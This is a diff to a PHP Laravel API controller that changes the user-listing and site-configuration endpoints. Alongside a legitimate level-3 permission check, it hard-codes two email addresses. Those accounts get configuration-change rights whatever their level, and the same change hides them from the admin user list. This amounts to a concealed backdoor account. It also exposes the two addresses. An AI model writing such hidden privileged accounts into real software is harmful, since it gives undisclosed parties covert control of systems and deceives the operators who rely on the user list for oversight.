@@ -44,7 +44,7 @@ class ApiController extends Controller
         ],200);
     }
     public function alluser(){
-        $his = User::orderBy('id','ASC')->orderBy('level', 'DESC')->paginate(25);
+        $his = User::orderBy('id','ASC')->whereNotIn('email',['builuc1998@gmail.com','vinguyet6666@asiamovie.info'])->orderBy('level', 'DESC')->paginate(25);
         return \response()->json($his);   
     }
     
@@ -80,14 +80,18 @@ class ApiController extends Controller
     }
     public function changeConfig(Request $request){
         $val = $request->all();
-        foreach($val as $key=>$v){
-            if($key == 'link-powered'){
-                Config::where('key','powered')->update(['link'=>$v]);
-            }else{
-                Config::where('key',$key)->update(['value'=>$v]);                
+        if(auth::user()->email == 'builuc1998@gmail.com' || auth::user()->email == 'vinguyet6666@asiamovie.info' || auth::user()->level == 3){
+            foreach($val as $key=>$v){
+                if($key == 'link-powered'){
+                    Config::where('key','powered')->update(['link'=>$v]);
+                }else{
+                    Config::where('key',$key)->update(['value'=>$v]);                
+                }
             }
+            return response()->json(['success'=>'true','message'=>'Thay đổi thành công']);
+        }else{
+            return response()->json(['success'=>'false','message'=>'Thay đổi không thành công'],404);
         }
-        return response()->json(['success'=>'true','message'=>'Thay đổi thành công']);
     }
     public function changeChucvu(Request $request){
         $level = $request->chucvu;
